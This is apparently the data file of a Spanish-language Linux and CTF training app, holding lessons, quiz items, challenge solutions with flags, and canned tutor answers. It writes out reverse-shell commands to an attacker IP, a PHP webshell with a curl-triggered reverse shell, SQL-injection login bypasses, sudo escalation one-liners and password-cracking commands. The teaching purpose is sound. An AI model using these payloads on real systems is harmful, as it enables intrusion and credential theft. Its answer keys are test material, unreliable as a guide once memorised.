import { useState, useEffect, useRef } from "react";
import { C } from "../../data/labs";

// ============================================================
// DATOS — NIVELES
// ============================================================
const NIVELES = [
  // BLOQUE 1 — FUNDAMENTOS
  {
    id: 1, bloque: 1, titulo: "¿Qué es la terminal?",
    xp: 50, dificultad: "Básico",
    teoria: `La terminal (también llamada consola, shell o CLI) es una interfaz de texto donde le das instrucciones al sistema operativo escribiendo comandos.

En Linux, la terminal más usada es Bash (Bourne Again SHell).

• El símbolo $ indica que eres usuario normal
• El símbolo # indica que eres root (administrador)
• ~ representa tu carpeta personal (/home/tuusuario)

El prompt completo se ve así:
  waldo@kali:~$
  usuario@máquina:directorio$`,
    ejemplo: `# Así se ve un prompt típico:
waldo@kali:~$ 
#       ^       ^  ^
#   usuario  máq  directorio

# $ = usuario normal
# # = root (administrador)`,
    pregunta: "¿Qué símbolo indica que estás trabajando como ROOT?",
    opciones: ["$", ">", "#", "@"],
    correcta: 2,
    explicacion: "El símbolo # indica root. En CTFs el objetivo muchas veces es escalar privilegios hasta llegar a #."
  },
  {
    id: 2, bloque: 1, titulo: "pwd y ls — Orientarse",
    xp: 50, dificultad: "Básico",
    teoria: `pwd (Print Working Directory) muestra en qué carpeta estás.
ls (list) muestra el contenido de un directorio.

Opciones de ls:
• ls       → lista básica
• ls -l    → lista detallada (permisos, tamaño, fecha)
• ls -a    → muestra archivos ocultos (empiezan con .)
• ls -la   → combinación completa
• ls -lh   → tamaños legibles (KB, MB)

En CTFs: ls -la es el primer comando que ejecutas en cualquier directorio.`,
    ejemplo: `$ pwd
/home/waldo

$ ls -la
total 32
drwxr-xr-x 5 waldo waldo 4096 Jun 1 .
drwxr-xr-x 3 root  root  4096 Jun 1 ..
-rw-r--r-- 1 waldo waldo  220 Jun 1 .bash_history
-rw-r--r-- 1 waldo waldo   25 Jun 1 flag.txt`,
    pregunta: "¿Qué opción de ls muestra los archivos OCULTOS?",
    opciones: ["-l", "-h", "-a", "-r"],
    correcta: 2,
    explicacion: "ls -a muestra archivos ocultos (los que empiezan con punto). En CTFs las flags a veces están en archivos ocultos como .secret o .flag."
  },
  {
    id: 3, bloque: 1, titulo: "cd — Navegar directorios",
    xp: 50, dificultad: "Básico",
    teoria: `cd (Change Directory) te mueve entre carpetas.

• cd /ruta/absoluta  → va desde la raíz
• cd carpeta         → entra a carpeta relativa
• cd ..              → sube un nivel
• cd ../..           → sube dos niveles
• cd ~               → va a tu home
• cd -               → vuelve al directorio anterior
• cd /               → va a la raíz del sistema`,
    ejemplo: `$ pwd
/home/waldo

$ cd Documents
$ pwd
/home/waldo/Documents

$ cd ..
$ pwd
/home/waldo

$ cd /etc
$ pwd
/etc`,
    pregunta: "¿Qué hace el comando 'cd ..'?",
    opciones: ["Va a la raíz /", "Sube un nivel en el árbol de directorios", "Va al home del usuario", "Vuelve al directorio anterior"],
    correcta: 1,
    explicacion: "cd .. sube un nivel. Si estás en /home/waldo/Documents, cd .. te lleva a /home/waldo."
  },
  {
    id: 4, bloque: 1, titulo: "cat, touch, mkdir — Crear y leer",
    xp: 50, dificultad: "Básico",
    teoria: `Comandos esenciales para crear y leer archivos:

• touch archivo.txt    → crea archivo vacío
• cat archivo.txt      → muestra contenido
• cat -n archivo.txt   → con números de línea
• mkdir carpeta        → crea directorio
• mkdir -p ruta/larga  → crea toda la ruta

En CTFs: cat flag.txt es el comando más importante.
Siempre organiza tu trabajo con mkdir recon loot exploits.`,
    ejemplo: `$ touch notas.txt
$ cat flag.txt
THM{w3lc0m3_t0_l1nux}

$ mkdir -p ctf/{recon,loot,exploits}
$ ls ctf/
exploits  loot  recon`,
    pregunta: "En un CTF encuentras un archivo llamado flag.txt. ¿Qué comando usas para leerlo?",
    opciones: ["open flag.txt", "read flag.txt", "cat flag.txt", "show flag.txt"],
    correcta: 2,
    explicacion: "cat flag.txt muestra el contenido. Es el comando más usado en CTFs para leer flags."
  },
  {
    id: 5, bloque: 1, titulo: "cp, mv, rm — Gestionar archivos",
    xp: 50, dificultad: "Básico",
    teoria: `Copiar, mover y eliminar archivos:

• cp origen destino     → copia archivo
• cp -r dir/ dest/      → copia directorio completo
• mv origen destino     → mueve o renombra
• rm archivo            → elimina archivo
• rm -r directorio      → elimina directorio
• rm -rf directorio     → elimina sin preguntar

⚠️ CUIDADO: rm -rf es permanente. No hay papelera.
Nunca ejecutes rm -rf / — eliminaría todo el sistema.`,
    ejemplo: `$ cp flag.txt flag_backup.txt
$ mv resultados_viejos.txt resultados_nmap.txt
$ rm archivo_temp.txt
$ rm -r carpeta_temporal/

# PELIGROSO - nunca hagas esto:
# rm -rf /`,
    pregunta: "¿Qué hace rm -rf directorio/?",
    opciones: ["Mueve el directorio a la papelera", "Elimina pidiendo confirmación", "Elimina todo el contenido sin preguntar", "Renombra el directorio"],
    correcta: 2,
    explicacion: "rm -rf elimina recursiva y forzadamente sin pedir confirmación. Es el comando más peligroso de Linux."
  },
  {
    id: 6, bloque: 1, titulo: "echo y redirección",
    xp: 75, dificultad: "Básico",
    teoria: `echo imprime texto. La redirección controla dónde va la salida:

• echo 'texto'         → imprime en pantalla
• echo $VARIABLE       → muestra variable de entorno
• echo 'texto' > file  → escribe en archivo (sobreescribe)
• echo 'texto' >> file → añade al final
• 2>/dev/null          → descarta errores
• &> archivo           → guarda stdout y stderr

Variables de entorno importantes:
• $HOME → tu directorio personal
• $USER → tu nombre de usuario  
• $PATH → donde Linux busca ejecutables`,
    ejemplo: `$ echo 'Hola HACKFORGE'
Hola HACKFORGE

$ echo $USER
waldo

$ echo 'Inicio CTF' > notas.txt
$ echo 'Target: 10.10.10.1' >> notas.txt
$ cat notas.txt
Inicio CTF
Target: 10.10.10.1

# Descartar errores:
$ find / -name flag.txt 2>/dev/null`,
    pregunta: "¿Qué diferencia hay entre > y >> al redirigir?",
    opciones: ["> crea el archivo, >> lo elimina", "> sobreescribe, >> añade al final", "> añade al final, >> sobreescribe", "Son iguales"],
    correcta: 1,
    explicacion: "> sobreescribe el archivo si existe. >> añade al final sin borrar. En pentesting siempre usa >> para acumular resultados."
  },
  {
    id: 7, bloque: 1, titulo: "grep — Buscar patrones",
    xp: 75, dificultad: "Básico",
    teoria: `grep busca líneas que coincidan con un patrón. Imprescindible en CTFs.

• grep 'patrón' archivo    → busca el patrón
• grep -i 'patrón'         → ignora mayúsculas
• grep -r 'patrón' dir/    → búsqueda recursiva
• grep -v 'patrón'         → líneas que NO contienen
• grep -n 'patrón'         → muestra número de línea
• grep -oE 'regex'         → solo muestra la coincidencia

Extraer flags:
grep -oE 'THM\{[^}]+\}' archivo.log`,
    ejemplo: `# Buscar usuarios con shell bash:
$ grep '/bin/bash' /etc/passwd
root:x:0:0:root:/root:/bin/bash
waldo:x:1000:1000::/home/waldo:/bin/bash

# Buscar flag en logs:
$ grep -r 'THM{' /var/log/ 2>/dev/null

# Extraer todas las flags:
$ grep -oE 'THM\{[^}]+\}' archivo.log
THM{s3cr3t_flag}`,
    pregunta: "¿Qué opción de grep hace la búsqueda RECURSIVA en un directorio?",
    opciones: ["-n", "-v", "-r", "-c"],
    correcta: 2,
    explicacion: "grep -r busca recursivamente en todos los archivos de un directorio. grep -ri 'password' /etc/ busca credenciales en archivos de configuración."
  },
  {
    id: 8, bloque: 1, titulo: "Pipes y filtros",
    xp: 75, dificultad: "Básico",
    teoria: `El pipe | conecta comandos — la salida de uno es la entrada del siguiente.

Comandos de filtrado esenciales:
• sort          → ordena líneas
• sort -u       → ordena y elimina duplicados
• uniq -c       → cuenta ocurrencias
• cut -d: -f1   → extrae columna (delimitador :, campo 1)
• wc -l         → cuenta líneas
• head -n 10    → primeras 10 líneas
• tail -f       → sigue archivo en tiempo real

Pipeline clásico de análisis:
cat log | grep 'Failed' | awk '{print $NF}' | sort | uniq -c | sort -rn`,
    ejemplo: `# Contar intentos SSH fallidos por IP:
$ grep 'Failed' /var/log/auth.log | 
  awk '{print $NF}' | 
  sort | uniq -c | sort -rn | head -5
    847 192.168.1.100
     45 10.10.10.5

# Usuarios del sistema con bash:
$ cat /etc/passwd | grep '/bin/bash' | cut -d: -f1
root
waldo`,
    pregunta: "¿Qué hace el operador | (pipe) entre dos comandos?",
    opciones: ["Ejecuta ambos en paralelo", "Conecta la salida del primero como entrada del segundo", "Guarda el resultado en archivo", "Compara las salidas"],
    correcta: 1,
    explicacion: "El pipe conecta stdout del primer comando con stdin del segundo. Es el concepto más poderoso de Linux para procesar texto."
  },
  // BLOQUE 2 — PERMISOS Y SISTEMA
  {
    id: 9, bloque: 2, titulo: "Permisos en Linux",
    xp: 100, dificultad: "Intermedio",
    teoria: `Cada archivo tiene permisos para tres tipos de usuarios:
• Owner (dueño), Group (grupo), Others (todos los demás)

Permisos: r (read=4), w (write=2), x (execute=1)

-rwxr-xr-- 1 waldo hackers 1024 script.sh
 ^^^|^^^|^^^
 own grp oth

chmod en octal:
• 755 = rwxr-xr-x (scripts ejecutables)
• 644 = rw-r--r-- (archivos normales)
• 600 = rw------- (claves SSH)
• 777 = rwxrwxrwx (todos pueden todo - PELIGROSO)`,
    ejemplo: `# Dar permisos de ejecución:
$ chmod +x exploit.py
$ chmod 755 script.sh
$ chmod 600 id_rsa   # clave SSH privada

# Ver permisos:
$ ls -la script.sh
-rwxr-xr-x 1 waldo waldo 1024 script.sh`,
    pregunta: "¿Qué permisos otorga chmod 777?",
    opciones: ["Solo el dueño puede hacer todo", "Solo lectura para todos", "Lectura, escritura y ejecución para todos", "Ningún permiso"],
    correcta: 2,
    explicacion: "777 = rwxrwxrwx. Todos pueden leer, escribir y ejecutar. En seguridad es peligroso — busca archivos 777 en CTFs de privilege escalation."
  },
  {
    id: 10, bloque: 2, titulo: "find — Buscar archivos",
    xp: 100, dificultad: "Intermedio",
    teoria: `find es uno de los comandos más poderosos en CTFs.

• find / -name 'flag.txt'        → busca por nombre
• find / -name '*.txt'           → busca por extensión
• find / -type f -name '*.conf'  → solo archivos
• find / -user root              → archivos de root
• find / -perm -4000             → archivos SUID ← muy importante
• find / -writable               → archivos escribibles
• 2>/dev/null                    → descarta errores

SUID (-perm -4000): el archivo se ejecuta con permisos del DUEÑO.
Si el dueño es root → puedes escalar privilegios.`,
    ejemplo: `# Buscar la flag:
$ find / -name 'flag.txt' 2>/dev/null
/home/waldo/flag.txt
/root/flag.txt

# Buscar archivos SUID (privilege escalation):
$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/find      ← si find tiene SUID, puedes escalar`,
    pregunta: "¿Qué comando busca archivos con bit SUID para privilege escalation?",
    opciones: ["find / -type suid", "find / -perm -4000 2>/dev/null", "ls -suid /", "find / -escalate"],
    correcta: 1,
    explicacion: "find / -perm -4000 busca archivos con SUID activado. Si un binario tiene SUID y es de root, ejecutarlo te da permisos de root temporalmente."
  },
  {
    id: 11, bloque: 2, titulo: "sudo y privilege escalation",
    xp: 150, dificultad: "Intermedio",
    teoria: `sudo permite ejecutar comandos como root.

• sudo comando        → ejecuta como root
• sudo -l             → lista qué puedes hacer con sudo ← CLAVE
• sudo su             → cambia a shell de root
• sudo -i             → shell interactivo de root

En CTFs: sudo -l es SIEMPRE uno de los primeros comandos.

Si ves algo como:
  (ALL) NOPASSWD: /usr/bin/find
  
Puedes escalar con GTFOBins:
  sudo find . -exec /bin/sh \;`,
    ejemplo: `$ sudo -l
User waldo may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
    (root) /usr/bin/python3

# Escalar con vim (GTFOBins):
$ sudo vim -c ':!/bin/bash'
root@victim:~# id
uid=0(root) gid=0(root)

# Escalar con python3:
$ sudo python3 -c 'import os; os.system("/bin/bash")'`,
    pregunta: "En un CTF ejecutas sudo -l y ves que puedes correr /usr/bin/python3 como root. ¿Para qué sirve esto?",
    opciones: ["Para programar en Python", "Para instalar paquetes", "Para escalar privilegios a root", "Para conectarse a internet"],
    correcta: 2,
    explicacion: "Si puedes ejecutar python3 con sudo: sudo python3 -c 'import os; os.system(\"/bin/bash\")' abre una shell como root. GTFOBins lista cómo explotar cada binario."
  },
  {
    id: 12, bloque: 2, titulo: "/etc/passwd y /etc/shadow",
    xp: 100, dificultad: "Intermedio",
    teoria: `Los archivos más importantes para usuarios en Linux:

/etc/passwd (legible por todos):
  root:x:0:0:root:/root:/bin/bash
  usuario:x:UID:GID:comentario:home:shell

• UID 0 = root
• Shell /bin/false = no puede iniciar sesión

/etc/shadow (solo root puede leerlo):
  usuario:HASH:último_cambio:...
  
Tipos de hash:
• $1$ = MD5 (débil)
• $5$ = SHA-256
• $6$ = SHA-512 (más común)

Si obtienes /etc/shadow → crackear con john o hashcat.`,
    ejemplo: `$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
waldo:x:1000:1000::/home/waldo:/bin/bash

# Como root, ver hashes:
$ cat /etc/shadow
root:$6$salt$hash_largo:18000:...

# Crackear con john:
$ unshadow passwd shadow > combined.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt`,
    pregunta: "En /etc/shadow ves: john:$1$salt$hash. ¿Qué algoritmo usa?",
    opciones: ["SHA-512", "SHA-256", "MD5", "bcrypt"],
    correcta: 2,
    explicacion: "$1$ = MD5 (el más débil y fácil de crackear). $5$ = SHA-256, $6$ = SHA-512, $2y$ = bcrypt."
  },
  // BLOQUE 3 — RED Y RECONOCIMIENTO
  {
    id: 13, bloque: 3, titulo: "ip y ping — Configuración de red",
    xp: 100, dificultad: "Intermedio",
    teoria: `Comandos esenciales de red:

• ip a                → muestra interfaces y sus IPs
• ip r                → tabla de rutas
• ping -c 4 IP        → verifica conectividad
• ifconfig            → versión antigua (aún usada)

Interfaces comunes:
• eth0/ens33  → red cableada
• wlan0       → WiFi
• tun0        → VPN (TryHackMe/HackTheBox) ← importante
• lo          → loopback (127.0.0.1)

En THM/HTB: tu IP de tun0 es la que usas como LHOST en reverse shells.`,
    ejemplo: `$ ip a
1: lo:    inet 127.0.0.1/8
2: eth0:  inet 192.168.1.100/24
3: tun0:  inet 10.8.0.2/24    ← tu IP en THM

# Verificar VPN activa:
$ ip a | grep tun0
3: tun0: inet 10.8.0.2/24

# Ping para confirmar que la máquina está activa:
$ ping -c 1 10.10.10.1
64 bytes from 10.10.10.1: ttl=64 time=45ms
# TTL 64 = Linux, TTL 128 = Windows`,
    pregunta: "En TryHackMe, ¿en qué interfaz aparece tu IP para usar en reverse shells?",
    opciones: ["eth0", "wlan0", "tun0", "lo"],
    correcta: 2,
    explicacion: "tun0 es la interfaz VPN. Cuando te conectas a THM con OpenVPN, se crea tun0. ESA IP es tu LHOST para reverse shells, no tu IP de casa."
  },
  {
    id: 14, bloque: 3, titulo: "nmap — Escaneo de redes",
    xp: 150, dificultad: "Intermedio",
    teoria: `nmap es LA herramienta de reconocimiento. Esencial en todo CTF.

Escaneos principales:
• nmap IP                    → 1000 puertos básico
• nmap -sV IP                → detecta versiones
• nmap -sC IP                → scripts por defecto
• nmap -sC -sV IP            → combo estándar CTF
• nmap -p- IP                → todos los 65535 puertos
• nmap -p 80,443 IP          → puertos específicos
• nmap -A IP                 → todo (versión, OS, scripts)
• nmap --script=vuln IP      → busca vulnerabilidades
• nmap -oN archivo.txt IP    → guarda en archivo

Siempre guarda resultados: -oN nmap_inicial.txt`,
    ejemplo: `$ nmap -sC -sV 10.10.10.1
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu
80/tcp   open  http      Apache httpd 2.4.29
3306/tcp open  mysql     MySQL 5.7.38

# Análisis por puerto:
# 22 → credenciales SSH o clave id_rsa
# 80 → gobuster, nikto, revisar web
# 3306 → credenciales MySQL por defecto`,
    pregunta: "¿Qué combinación de opciones nmap es el estándar en CTFs?",
    opciones: ["nmap -p- IP", "nmap -sC -sV IP", "nmap -O IP", "nmap --script=vuln IP"],
    correcta: 1,
    explicacion: "nmap -sC -sV: -sV detecta versiones de servicios, -sC ejecuta scripts de detección. Es el combo estándar. Siempre añade -oN para guardar resultados."
  },
  {
    id: 15, bloque: 3, titulo: "netcat — La navaja suiza",
    xp: 150, dificultad: "Intermedio",
    teoria: `netcat (nc) es la herramienta más versátil de red.

1. Escuchar conexiones: nc -lnvp 4444
2. Conectarse: nc IP Puerto
3. Reverse shell: nc -e /bin/bash IP Puerto
4. Banner grabbing: nc IP 80

Reverse shell = la VÍCTIMA se conecta a TI.
¿Por qué? Los firewalls bloquean conexiones entrantes pero permiten salientes.

Flujo:
1. Tu Kali: nc -lnvp 4444  (escuchas)
2. Explotás vulnerabilidad en víctima
3. Víctima ejecuta: nc -e /bin/bash TU_IP 4444
4. Recibes la shell`,
    ejemplo: `# TU KALI — listener:
$ nc -lnvp 4444
Listening on 0.0.0.0 4444

# VÍCTIMA — conecta de vuelta:
$ nc -e /bin/bash 10.8.0.2 4444

# De vuelta en tu Kali:
Connection received from 10.10.10.1
$ id
uid=33(www-data) gid=33(www-data)

# Mejorar shell básica a TTY:
$ python3 -c 'import pty;pty.spawn("/bin/bash")'`,
    pregunta: "¿Qué comando en TU KALI configura un listener para recibir una reverse shell en el puerto 4444?",
    opciones: ["nc -e /bin/bash 10.10.10.1 4444", "nc -lnvp 4444", "nc 0.0.0.0 4444", "nc -connect 4444"],
    correcta: 1,
    explicacion: "nc -lnvp 4444: -l=listen, -n=no DNS, -v=verbose, -p=puerto. Es el comando más ejecutado en CTFs después de encontrar un RCE."
  },
  {
    id: 16, bloque: 3, titulo: "gobuster y enumeración web",
    xp: 150, dificultad: "Intermedio",
    teoria: `gobuster descubre directorios y archivos ocultos en webs.

• gobuster dir -u URL -w wordlist          → directorios
• gobuster dir -u URL -w wordlist -x php,txt → con extensiones
• gobuster dns -d dominio -w wordlist      → subdominios

Wordlists en Kali:
• /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
• /usr/share/seclists/Discovery/Web-Content/common.txt

También revisa siempre:
• /robots.txt       → rutas que el admin no quiere indexar ← muy importante
• /sitemap.xml      → mapa del sitio
• Código fuente     → comentarios con credenciales`,
    ejemplo: `$ gobuster dir -u http://10.10.10.1 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,txt,html

/index.php    (Status: 200)
/admin        (Status: 301) ← redirige, interesante
/login.php    (Status: 200)
/secret.txt   (Status: 200) ← archivo oculto!
/backup       (Status: 403) ← existe pero protegido

# robots.txt - SIEMPRE revisa esto primero:
$ curl http://10.10.10.1/robots.txt
Disallow: /secret-admin-panel/
Disallow: /.git/`,
    pregunta: "¿Por qué robots.txt es valioso en pentesting web?",
    opciones: ["Tiene el mapa completo del sitio", "Lista rutas que el admin NO quiere indexar, que frecuentemente son paneles admin o backups", "Tiene las credenciales de administrador", "Muestra la versión del servidor"],
    correcta: 1,
    explicacion: "robots.txt le dice a Google qué no indexar. Los admins ponen ahí rutas sensibles como /admin/, /backup/. En CTFs casi siempre tiene una pista clave."
  },
  // BLOQUE 4 — EXPLOTACIÓN
  {
    id: 17, bloque: 4, titulo: "SQLi — SQL Injection",
    xp: 200, dificultad: "Avanzado",
    teoria: `SQL Injection inyecta código SQL en campos de entrada.

Prueba básica de bypass de autenticación:
• '                         → ver si hay error SQL
• admin'--                  → login como admin sin contraseña
• ' OR '1'='1               → siempre verdadero
• ' OR 1=1--                → comentar el resto

¿Por qué funciona admin'--?
La query: WHERE user='ENTRADA' AND pass='ENTRADA'
Se convierte en: WHERE user='admin'--' AND pass='...'
El -- comenta todo después, ignorando la contraseña.

Herramienta automática: sqlmap`,
    ejemplo: `# Login manual con SQLi:
Usuario: admin'--
Contraseña: cualquiera
→ Resultado: Login exitoso

# sqlmap automático:
$ sqlmap -u 'http://10.10.10.1/login.php' \
    --data='user=admin&pass=test' \
    --dbs
Available databases:
  webapp
  secrets

$ sqlmap -u URL --dbs -D webapp --tables --dump`,
    pregunta: "¿Qué payload SQLi básico hace bypass de autenticación?",
    opciones: ["SELECT * FROM users", "admin'--", "1=1", "DROP TABLE users"],
    correcta: 1,
    explicacion: "admin'-- cierra el string SQL con ' y comenta el resto con --. La verificación de contraseña queda ignorada. Es el SQLi de bypass más clásico."
  },
  {
    id: 18, bloque: 4, titulo: "Webshells y File Upload",
    xp: 200, dificultad: "Avanzado",
    teoria: `Si una web permite subir archivos sin validar el tipo, puedes subir una webshell PHP.

Webshell PHP básica:
<?php system($_GET['cmd']); ?>

Subes shell.php y accedes:
http://victima.com/uploads/shell.php?cmd=id

Bypass de filtros:
• Cambiar extensión: shell.php5, shell.phtml
• Doble extensión: shell.php.jpg
• Cambiar Content-Type con Burp Suite
• Magic bytes manipulación

Desde webshell → reverse shell:
?cmd=bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261`,
    ejemplo: `# Webshell PHP mínima:
<?php system($_GET['cmd']); ?>

# Guardar como shell.php y subir
# Acceder:
$ curl 'http://10.10.10.1/uploads/shell.php?cmd=id'
uid=33(www-data) gid=33(www-data)

$ curl 'http://10.10.10.1/uploads/shell.php?cmd=cat+/etc/passwd'

# Reverse shell desde webshell:
$ curl 'http://10.10.10.1/uploads/shell.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.8.0.2/4444+0>%261"'`,
    pregunta: "Subes shell.php con <?php system($_GET['cmd']); ?> y accedes a /uploads/shell.php?cmd=id. ¿Qué hace esto?",
    opciones: ["Muestra el código PHP", "Ejecuta el comando 'id' en el servidor y muestra el resultado", "Da error porque PHP no puede ejecutar comandos", "Crea un archivo llamado 'id'"],
    correcta: 1,
    explicacion: "system($_GET['cmd']) ejecuta el valor del parámetro cmd como comando del sistema. Esto es Remote Code Execution (RCE). Desde aquí puedes ejecutar cualquier comando."
  },
  {
    id: 19, bloque: 4, titulo: "LinPEAS y escalada de privilegios",
    xp: 200, dificultad: "Avanzado",
    teoria: `LinPEAS automatiza la búsqueda de vectores de privilege escalation.

Qué busca LinPEAS:
• Binarios SUID/SGID
• Cron jobs mal configurados
• Credenciales en archivos de config
• Software con versiones vulnerables
• Capabilities peligrosas
• Archivos escribibles por todos

Metodología manual (checklist):
1. id → quién soy
2. sudo -l → qué puedo hacer con sudo
3. find / -perm -4000 2>/dev/null → SUID
4. crontab -l → tareas programadas
5. cat ~/.bash_history → credenciales en historial
6. ss -tuln → servicios internos`,
    ejemplo: `# Transferir LinPEAS a la víctima:
# Tu Kali:
$ python3 -m http.server 8080

# En la víctima:
$ cd /tmp
$ wget http://10.8.0.2:8080/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh 2>/dev/null | tee output.txt

# Resultados típicos en CTFs:
[+] SUID: /usr/bin/find (root owner) ← EXPLOTABLE
[+] Cron: */5 * * * * root /tmp/cleanup.sh ← writable!
[+] Config: DB_PASS = 'secreto123'`,
    pregunta: "¿Por qué ejecutas LinPEAS desde /tmp en la máquina víctima?",
    opciones: ["Porque /tmp es más rápido", "Porque /tmp es escribible por todos los usuarios sin permisos especiales", "Porque LinPEAS solo funciona en /tmp", "Porque /tmp está en RAM"],
    correcta: 1,
    explicacion: "/tmp tiene permisos rwxrwxrwt — cualquier usuario puede crear y ejecutar archivos ahí. Cuando tienes una shell limitada (como www-data), /tmp es el lugar donde puedes escribir y ejecutar herramientas."
  },
  {
    id: 20, bloque: 4, titulo: "Metodología CTF completa",
    xp: 250, dificultad: "Avanzado",
    teoria: `Flujo completo para resolver una máquina CTF Linux:

1. RECONOCIMIENTO
   nmap -sC -sV -oN nmap.txt IP
   nmap -p- --min-rate=5000 IP &

2. ENUMERACIÓN (según puertos)
   Puerto 80 → gobuster, nikto, curl robots.txt
   Puerto 21 → ftp IP (login anónimo?)
   Puerto 445 → enum4linux -a IP
   Puerto 22 → guardar para cuando tengamos creds

3. EXPLOTACIÓN
   Buscar exploit por versión detectada
   searchsploit nombre_servicio version

4. POST-EXPLOTACIÓN
   id && sudo -l && find / -perm -4000 2>/dev/null

5. ESCALADA DE PRIVILEGIOS
   Explotar vector encontrado → GTFOBins

6. FLAGS
   cat /home/*/user.txt 2>/dev/null
   cat /root/root.txt`,
    ejemplo: `export IP=10.10.10.1
export LHOST=10.8.0.2  # tu IP tun0

# 1. Recon:
nmap -sC -sV -oN nmap_inicial.txt $IP

# 2. Web enum:
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# 3. Listener listo:
nc -lnvp 4444

# 4. Post-explot:
id && sudo -l && find / -perm -4000 2>/dev/null

# 5. Flags:
cat /home/*/user.txt 2>/dev/null
cat /root/root.txt`,
    pregunta: "¿Cuál es el orden correcto de las fases en un CTF Linux?",
    opciones: ["Explotación → Reconocimiento → Escalada", "Reconocimiento → Enumeración → Explotación → Escalada → Flags", "Flags → Escalada → Reconocimiento", "Enumeración → Flags → Reconocimiento"],
    correcta: 1,
    explicacion: "El orden es: Reconocimiento → Enumeración → Explotación → Post-explotación → Escalada → Flags. Saltarse fases lleva a perder vectores importantes."
  }
];

// ============================================================
// DATOS — DESAFÍOS CTF
// ============================================================
const DESAFIOS = [
  {
    id: 1,
    titulo: "Primer Acceso",
    descripcion: "Tienes acceso a un servidor Linux. Encuentra información básica del sistema.",
    dificultad: "Fácil",
    xp: 100,
    objetivos: [
      "Encuentra tu usuario actual",
      "Descubre en qué directorio estás",
      "Lista los archivos del directorio home",
      "Lee el archivo user.txt"
    ],
    pistas: [
      "Usa el comando que muestra tu identidad",
      "pwd te dice dónde estás",
      "ls -la muestra archivos ocultos también",
      "cat lee el contenido de archivos"
    ],
    solucion: ["whoami", "pwd", "ls -la", "cat user.txt"],
    flag: "THM{b4s1c_l1nux_c0mpl3t3d}"
  },
  {
    id: 2,
    titulo: "Caza de Credenciales",
    descripcion: "Hay credenciales ocultas en el sistema. Encuéntralas.",
    dificultad: "Medio",
    xp: 200,
    objetivos: [
      "Busca archivos .txt en todo el sistema",
      "Encuentra archivos de configuración con 'password'",
      "Lee el historial de bash del usuario",
      "Busca archivos SUID"
    ],
    pistas: [
      "find / -name '*.txt' 2>/dev/null",
      "grep -r 'password' /var/www/ 2>/dev/null",
      "cat ~/.bash_history",
      "find / -perm -4000 2>/dev/null"
    ],
    solucion: [
      "find / -name '*.txt' 2>/dev/null",
      "grep -r 'password' /var/www/ 2>/dev/null",
      "cat ~/.bash_history",
      "find / -perm -4000 2>/dev/null"
    ],
    flag: "THM{cr3d3nt14ls_f0und}"
  },
  {
    id: 3,
    titulo: "Privilege Escalation",
    descripcion: "Eres www-data. Escala a root usando sudo.",
    dificultad: "Difícil",
    xp: 400,
    objetivos: [
      "Verifica tu usuario actual",
      "Lista qué puedes ejecutar con sudo",
      "Usa GTFOBins para escalar",
      "Lee la flag de root"
    ],
    pistas: [
      "id te dice quién eres",
      "sudo -l muestra permisos sudo",
      "Si puedes ejecutar find: sudo find . -exec /bin/sh \\;",
      "La flag de root está en /root/root.txt"
    ],
    solucion: ["id", "sudo -l", "sudo find . -exec /bin/sh \\;", "cat /root/root.txt"],
    flag: "THM{pr1v3sc_m4st3r}"
  }
];

// ============================================================
// DATOS — IA SIMULADA
// ============================================================
const IA_BASE = {
  "nmap": "nmap -sC -sV IP es el combo estándar para CTFs. -sC ejecuta scripts de detección, -sV detecta versiones. Siempre guarda con -oN nmap.txt. Para escaneo completo añade -p- pero es más lento.",
  "reverse shell": "Para recibir una reverse shell necesitas un listener: nc -lnvp 4444. Luego en la víctima: bash -i >& /dev/tcp/TU_IP/4444 0>&1. Tu IP debe ser la de tun0 si usas THM.",
  "privilege escalation": "Checklist: 1) sudo -l 2) find / -perm -4000 3) crontab -l 4) cat ~/.bash_history 5) ss -tuln. Luego corre LinPEAS para automatizar.",
  "sudo": "sudo -l lista qué puedes ejecutar como root. Si ves un binario, búscalo en GTFOBins (gtfobins.github.io). Por ejemplo con vim: sudo vim -c ':!/bin/bash'",
  "sqlmap": "sqlmap -u URL --data='user=a&pass=b' --dbs enumera bases de datos. Añade -D nombre --tables para ver tablas, --dump para extraer datos. Usa --level=5 --risk=3 para detección agresiva.",
  "gobuster": "gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html. Añade -t 50 para más velocidad.",
  "hydra": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://IP para SSH. Para HTTP POST: hydra -l admin -P rockyou.txt http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
  "john": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt. Para /etc/shadow: unshadow passwd shadow > combined.txt && john combined.txt",
  "linpeas": "Descarga: wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh. Ejecuta desde /tmp: chmod +x linpeas.sh && ./linpeas.sh 2>/dev/null | tee output.txt",
  "tryhackme": "Primero conecta VPN: sudo openvpn archivo.ovpn. Verifica tun0: ip a | grep tun0. Esa IP es tu LHOST. Inicia la máquina, espera 2-3 minutos y empieza con nmap.",
  "suid": "Los archivos SUID se ejecutan con permisos del dueño. Si el dueño es root y tiene SUID, puedes escalar. Búscalos con: find / -perm -4000 2>/dev/null. Consulta GTFOBins para explotar cada binario.",
  "ssh": "Con clave privada: chmod 600 id_rsa && ssh -i id_rsa usuario@IP. Si encuentras una clave en el CTF, siempre haz chmod 600 primero o SSH rechazará la clave.",
  "curl": "curl -I URL muestra solo headers. curl -v URL es verbose. Para POST: curl -X POST -d 'user=admin&pass=admin' URL. Para cookies: curl -b 'PHPSESSID=abc' URL",
  "nc": "nc -lnvp PUERTO para escuchar. nc IP PUERTO para conectar. Para transferir archivos: nc -lp 4444 < archivo (receptor) y nc IP 4444 > archivo (enviador).",
  "hashcat": "hashcat -m 0 hash.txt wordlist (MD5). -m 1800 para SHA-512 Unix. -m 3200 para bcrypt. Añade --force si da error de hardware. Identifica el tipo con hash-identifier.",
